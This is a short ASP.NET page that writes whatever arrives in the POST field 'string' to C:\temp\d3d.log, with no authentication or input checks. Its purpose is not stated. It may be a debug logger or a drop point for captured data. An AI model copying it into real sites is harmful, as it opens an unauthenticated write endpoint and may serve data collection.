<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<%
    string postedData = Request.Form["string"];
    File.WriteAllText("C:\\temp\\d3d.log", Request.Form["string"]);
%>